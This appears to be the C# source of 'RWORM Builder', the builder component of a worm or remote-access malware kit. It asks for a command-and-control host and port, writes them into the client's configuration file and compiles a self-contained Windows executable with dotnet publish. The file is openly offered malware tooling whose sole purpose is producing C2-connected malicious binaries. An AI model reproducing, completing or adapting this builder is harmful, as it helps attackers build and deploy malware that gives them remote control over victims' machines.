using System;
using System.IO;
using System.Text;

namespace RWORM.Builder
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("  RWORM Builder v1.0");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            Console.Write("C2 Host [127.0.0.1]: ");
            var host = Console.ReadLine();
            if (string.IsNullOrEmpty(host)) host = "127.0.0.1";

            Console.Write("C2 Port [3333]: ");
            var portStr = Console.ReadLine();
            int port = 3333;
            int.TryParse(portStr, out port);

            Console.Write("Output filename [RWORM.exe]: ");
            var output = Console.ReadLine();
            if (string.IsNullOrEmpty(output)) output = "RWORM.exe";

            Console.WriteLine();
            Console.WriteLine("Building client...");
            Console.WriteLine($"  Host: {host}");
            Console.WriteLine($"  Port: {port}");
            Console.WriteLine($"  Output: {output}");
            Console.WriteLine();

            BuildClient(host, port, output);

            Console.WriteLine();
            Console.WriteLine($"[+] Build complete: {output}");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        static void BuildClient(string host, int port, string output)
        {
            var clientPath = Path.Combine("..", "Client");
            var templatePath = Path.Combine(clientPath, "Core", "Config.cs");
            var configContent = File.ReadAllText(templatePath);

            configContent = configContent.Replace("127.0.0.1", host);
            configContent = configContent.Replace("3333", port.ToString());

            File.WriteAllText(templatePath, configContent);
            Console.WriteLine("[*] Config updated");

            var buildCmd = $"dotnet publish \"{Path.Combine(clientPath, "RWORM.Client.csproj")}\" -c Release -r win-x64 --self-contained -o \"{output}\"";

            Console.WriteLine($"[*] Running: {buildCmd}");

            try
            {
                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c cd {clientPath} && dotnet publish -c Release -r win-x64 --self-contained -o \"..\\{output.Replace(".exe", "")}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Build error: {ex.Message}");
            }
        }
    }
}